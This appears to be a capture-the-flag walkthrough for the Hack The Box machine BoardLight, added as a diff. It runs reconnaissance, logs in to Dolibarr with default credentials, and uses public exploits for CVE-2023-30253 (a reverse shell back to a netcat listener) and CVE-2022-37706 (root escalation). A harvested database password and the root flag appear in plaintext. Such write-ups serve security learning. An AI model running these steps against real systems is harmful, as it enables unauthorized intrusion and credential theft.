@@ -1,0 +1,160 @@
+--------------------------------
+Machine name:   BoardLight
+Target-ip:      10.10.11.11
+My-ip:          10.10.14.2
+--------------------------------
+
+
+
+
+I firstly started by adding the machine ip address in my /etc/hosts file :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
+└──╼ [★]$ sudo vim /etc/hosts
+
+Then I obviously ran an NMAP scan on the target machine to discover open ports.
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
+└──╼ [★]$ sudo nmap -sC -sV -p- boardlight.htb > nmap_scan.txt
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
+└──╼ [★]$ cat nmap_scan.txt 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 11:43 CEST
+Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 68.10% done; ETC: 11:43 (0:00:07 remaining)
+Nmap scan report for boardlight.htb (10.10.11.11)
+Host is up (0.015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds
+
+
+Since there is a http port open, let's exlore the website.
+
+<insert image site1>
+
+I started a FFUF scan to bruteforce directories on the website, but nothing interesting came in.
+
+Well, what should I do now ? Maybe trying to fuzz subdomains... Yeah that's a good idea.
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
+└──╼ [★]$ wfuzz -c -w /security/tools/Kharon/ressources/wordlists/dir-enum-int-3.txt -u "http://board.htb/" -H "Host: FUZZ.board.htb" --hl 517
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://board.htb/
+Total requests: 220546
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                      
+=====================================================================
+
+000002010:   400        10 L     35 W       301 Ch      "'"            
+000002041:   200        149 L    504 W      6360 Ch     "crm"             
+000003776:   400        10 L     35 W       301 Ch      "%20" 
+000005288:   400        10 L     35 W       301 Ch      "$FILE"                          
+000005940:   400        10 L     35 W       301 Ch      "$file"        
+000006068:   200        149 L    504 W      6360 Ch     "CRM"                 
+
+Alright ! We found something ! I added the subdomain to my hosts file and I went to the website :
+
+<insert site 2>
+
+We have a Dolibarr login page here. Let's test the default credentials even if I think that it'll not work ahah...
+
+Default Dolibarr creds : admin/admin
+
+<insert site3>
+
+Well... what the fuck ?? It worked lol.
+
+We saw earlier that the version of Dolibarr running is 17.0. So we should search exploit for this version.
+
+I found that PoC during my research : https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
+So I cloned it and ran it :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
+└──╼ [★]$ python3 exploit.py http://crm.board.htb admin admin 10.10.14.2 4444
+[*] Trying authentication...
+[**] Login: admin
+[**] Password: admin
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
+└──╼ [★]$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.11] 58592
+bash: cannot set terminal process group (858): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
+
+
+And here we go ! We got an initial access to the target machine !
+
+I searched for dozen of minutes and I finally found some databases credentials in the conf.php file from the Dolibarr CMS :
+
+
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+
+Then, I tried to log as larissa with SSH and it worked !
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
+└──╼ [★]$ ssh larissa@board.htb
+larissa@board.htb's password: 
+Last login: Mon Jun 10 04:06:55 2024 from 10.10.14.2
+larissa@boardlight:~$ 
+
+Then I displaied the user.txt flag :
+
+larissa@boardlight:~$ cat user.txt
+...REDACTED...
+
+
+
+After some research, I found interesting binaries with the help of LinPEAS :
+
+-rw-r--r-- 1 root root 177 May  2 05:43 /etc/ssh/ssh_host_ecdsa_key.pub
+-rw-r--r-- 1 root root 97 May  2 05:43 /etc/ssh/ssh_host_ed25519_key.pub
+-rw-r--r-- 1 root root 569 May  2 05:43 /etc/ssh/ssh_host_rsa_key.pub
+
+
+It appears to be vulnerable and the exploit is named CVE-2022-37706. I found this PoC on github :
+https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
+
+
+I uploaded the bash file on the victime machine and I started it :
+
+larissa@boardlight:/tmp$ ./exploit.sh 
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
+
+
+# cat /root/root.txt
+1605468aaeea6710492ec1ecf77e892b
+
+And we got the root !
+
+
